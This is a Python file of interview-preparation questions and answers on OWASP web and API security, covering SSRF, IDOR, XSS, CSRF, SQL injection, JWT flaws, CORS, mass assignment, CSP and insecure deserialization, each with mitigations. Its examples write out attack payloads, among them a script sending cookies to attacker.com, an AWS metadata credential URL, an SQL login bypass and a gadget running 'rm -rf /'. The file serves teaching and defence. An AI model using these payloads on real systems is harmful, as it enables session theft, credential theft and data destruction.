"""
Application & API Security (OWASP Top 10) Interview Preparation Questions & Answers
Format: (Question, Crisp Answer with Key Characteristics and Example)
"""

qa_appsec = [
    (
        "What is Server-Side Request Forgery (SSRF) and how do attackers exploit it in cloud environments?",
        "**Direct Answer:** SSRF is a vulnerability where an attacker coerces a server-side web application into making unauthorized HTTP/network requests to internal or third-party resources that are inaccessible to the attacker directly.\n\n"
        "**Key Characteristics:**\n"
        "• Frequently targets internal metadata endpoints in cloud environments (e.g. AWS IMDS `http://169.254.169.254/latest/meta-data/`).\n"
        "• Can be Blind (no response returned, but network request executed) or Non-blind (response data rendered to user).\n"
        "• Mitigated by validating and allowlisting permitted protocols/domains, blocking RFC 1918 private IP ranges, and requiring IMDSv2 session tokens.\n\n"
        "**Example:** An application has an avatar import feature `fetch_avatar?url=...`; an attacker supplies `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to harvest temporary AWS IAM role credentials, resulting in a cloud infrastructure takeover."
    ),
    (
        "What is Broken Object Level Authorization (BOLA / IDOR) in REST APIs?",
        "**Direct Answer:** Broken Object Level Authorization (BOLA), also known as Insecure Direct Object Reference (IDOR), occurs when an API endpoint accepts an object identifier from user input to retrieve or modify data without verifying whether the requesting user actually owns or is authorized to access that object.\n\n"
        "**Key Characteristics:**\n"
        "• Ranked as the #1 threat in the OWASP API Security Top 10.\n"
        "• Arises from developer assumptions that client-side UI controls or hidden URL parameters prevent unauthorized access.\n"
        "• Mitigated by enforcing strict server-side authorization checks comparing `current_user.id` against `record.owner_id` on every query, and using random GUIDs/UUIDs instead of sequential numeric IDs.\n\n"
        "**Example:** An authenticated user checks their bank invoice at `GET /api/invoices/1042`; by changing the URL parameter to `GET /api/invoices/1043`, the API returns another customer's confidential financial document because ownership verification is missing."
    ),
    (
        "What is the difference between Stored, Reflected, and DOM-based Cross-Site Scripting (XSS)?",
        "**Direct Answer:** Stored XSS occurs when a malicious script is permanently saved in the application database and served to victims; Reflected XSS reflects malicious input off the web server in an immediate HTTP response; and DOM-based XSS executes entirely on the client-side by insecurely modifying the Document Object Model without server-side reflection.\n\n"
        "**Key Characteristics:**\n"
        "• Stored XSS is the most severe, compromising every visitor who views the affected page (e.g. comment sections).\n"
        "• Reflected XSS requires tricking a victim into clicking a crafted link containing the payload in query parameters.\n"
        "• DOM XSS is triggered via dangerous JavaScript sinks like `innerHTML`, `document.write()`, or `eval()` using sources like `location.search`.\n"
        "• Defended via contextual output encoding, Content Security Policy (CSP), and `HttpOnly` cookie flags to block session theft.\n\n"
        "**Example:** A user posts a comment `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` on a public forum; every user who views the forum thread executes the script, transmitting their session cookies to the attacker."
    ),
    (
        "What is Cross-Site Request Forgery (CSRF) and how do modern frameworks defend against it?",
        "**Direct Answer:** CSRF is an attack that tricks an authenticated end-user into submitting unwanted, forged HTTP requests to a web application in which they are currently logged in, leveraging the browser's automatic inclusion of session cookies.\n\n"
        "**Key Characteristics:**\n"
        "• Requires the victim to have an active authenticated session with the target application.\n"
        "• Does not allow the attacker to read the response (due to Same-Origin Policy), but forces state-changing actions (e.g., changing password, transferring funds).\n"
        "• Defended using Synchronizer Token Pattern (anti-CSRF tokens validating on state-changing POST/PUT requests) and `SameSite=Lax` or `SameSite=Strict` cookie attributes.\n\n"
        "**Example:** An attacker places a hidden `<img src=\"https://bank.com/transfer?amount=5000&to=attacker\">` on a forum; an authenticated user browsing the forum triggers the bank transfer automatically because their browser attaches active session cookies."
    ),
    (
        "How do SQL Injection (SQLi) attacks occur and why do Parameterized Queries prevent them?",
        "**Direct Answer:** SQL Injection occurs when untrusted user input is directly concatenated into dynamic SQL queries, altering the intended query logic; Parameterized Queries (Prepared Statements) prevent this by strictly separating the executable SQL code structure from the user-supplied data parameters.\n\n"
        "**Key Characteristics:**\n"
        "• Database engine pre-compiles the query template first, treating user input strictly as literal values regardless of syntax characters (`'`, `--`, `OR 1=1`).\n"
        "• Types of SQLi: In-band (Classic error-based or UNION-based), Inferential (Blind boolean-based, Blind time-based), and Out-of-band.\n"
        "• Stored procedures can still be vulnerable if they internally concatenate strings instead of using parameters.\n\n"
        "**Example:** In an insecure login `SELECT * FROM users WHERE user = '\" + input + \"'`: entering `' OR '1'='1' --` bypasses password verification; with `PreparedStatement.setString(1, input)`, the database searches for a literal username `' OR '1'='1' --`, failing the match safely."
    ),
    (
        "What are common security flaws in JWT (JSON Web Token) implementations?",
        "**Direct Answer:** Common JWT vulnerabilities stem from improper algorithm verification (accepting `alg: \"none\"` or converting asymmetric RS256 to symmetric HS256), using weak signing secrets vulnerable to offline dictionary brute-forcing, and failing to implement token revocation.\n\n"
        "**Key Characteristics:**\n"
        "• Algorithm Confusion (Key Confusion): Forcing an API expecting an RSA public key to verify signatures using HMAC with the public key as the symmetric secret.\n"
        "• `alg: \"none\"`: Vulnerable libraries accept unverified tokens where the signature header is omitted.\n"
        "• Lack of server-side state: Once issued, JWTs remain valid until expiration unless a blacklist/redis cache tracks revoked token IDs (`jti`).\n\n"
        "**Example:** An attacker modifies their JWT payload from `{\"user\": \"alice\", \"role\": \"user\"}` to `{\"user\": \"alice\", \"role\": \"admin\"}`, sets `\"alg\": \"none\"` in the header, removes the signature, and the vulnerable server grants admin privileges without checking the signature."
    ),
    (
        "What is Cross-Origin Resource Sharing (CORS) and what happens when Access-Control-Allow-Origin is misconfigured?",
        "**Direct Answer:** CORS is an HTTP-header based security mechanism that relaxes the browser's default Same-Origin Policy (SOP) to allow resources on one domain to be requested from another domain; misconfiguring `Access-Control-Allow-Origin: *` or dynamically reflecting origins with credentials enabled allows rogue domains to steal private user data.\n\n"
        "**Key Characteristics:**\n"
        "• Browsers block client-side JavaScript from reading cross-origin responses unless the server explicitly provides CORS headers.\n"
        "• Insecure pattern: Reflecting the incoming `Origin` header while setting `Access-Control-Allow-Credentials: true`.\n"
        "• Safe implementation: Hardcoded allowlist of trusted partner origins and disallowing credentials for public endpoints.\n\n"
        "**Example:** An internal healthcare dashboard dynamically returns `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`; when an employee visits `evil.com`, an attacker's script uses `fetch()` to steal the employee's patient medical records."
    ),
    (
        "What is Mass Assignment (Over-Posting) in modern web APIs?",
        "**Direct Answer:** Mass Assignment occurs when a framework automatically binds client-supplied JSON/form parameters directly to internal data models or database entity attributes without filtering, allowing attackers to modify sensitive fields they shouldn't control.\n\n"
        "**Key Characteristics:**\n"
        "• Common in frameworks like Ruby on Rails, ASP.NET Core, Spring Boot, and Node/Express with ORMs.\n"
        "• Attackers inject internal fields like `is_admin`, `account_balance`, or `role` into JSON request bodies.\n"
        "• Mitigated by using Data Transfer Objects (DTOs), explicit field allowlists (`strong_parameters`), or read-only property decorators.\n\n"
        "**Example:** A user profile update endpoint expects `{\"bio\": \"Security Researcher\"}`; an attacker sends `{\"bio\": \"Security Researcher\", \"is_admin\": true}`; the unconstrained ORM writes `is_admin=1` to the database, elevating privileges."
    ),
    (
        "What is Content Security Policy (CSP) and how does it prevent script injection?",
        "**Direct Answer:** CSP is an HTTP response header that restricts the resources (scripts, stylesheets, images, iframes) that a browser is permitted to load and execute for a given webpage, disabling dangerous inline scripts and restricting external source origins.\n\n"
        "**Key Characteristics:**\n"
        "• Disables `unsafe-inline` and `eval()` by default, requiring cryptographic nonces (`nonce-rAnd0m`) or hashes for legitimate inline scripts.\n"
        "• `frame-ancestors 'none'` directive defends against Clickjacking (modern replacement for `X-Frame-Options`).\n"
        "• Directives: `default-src 'self'`, `script-src 'nonce-...'`, `object-src 'none'`.\n\n"
        "**Example:** An attacker discovers an XSS vulnerability and injects `<script src=\"http://evil.com/keylogger.js\"></script>`; because `evil.com` is not in the server's `script-src` whitelist and lacks a valid nonce, the browser blocks script execution entirely."
    ),
    (
        "What is Insecure Deserialization and why does it frequently lead to Remote Code Execution (RCE)?",
        "**Direct Answer:** Insecure Deserialization occurs when untrusted, manipulated binary or structured data is converted back into an in-memory object by an application, allowing attackers to abuse magic methods or gadget chains to execute arbitrary code.\n\n"
        "**Key Characteristics:**\n"
        "• Common in Python (`pickle`), Java (`ObjectInputStream`), PHP (`unserialize`), and .NET (`BinaryFormatter`).\n"
        "• Relies on 'gadget chains': sequences of legitimate classes already present in application libraries (e.g. Apache Commons) that trigger dangerous execution during instantiation.\n"
        "• Mitigated by avoiding binary serialization formats, utilizing pure data interchange formats (JSON, Protocol Buffers), or enforcing digital signatures on serialized blobs.\n\n"
        "**Example:** A web session cookie contains serialized Java objects; an attacker uses `ysoserial` to construct a serialized gadget payload that invokes `Runtime.getRuntime().exec('rm -rf /')` when deserialized by the application."
    )
]
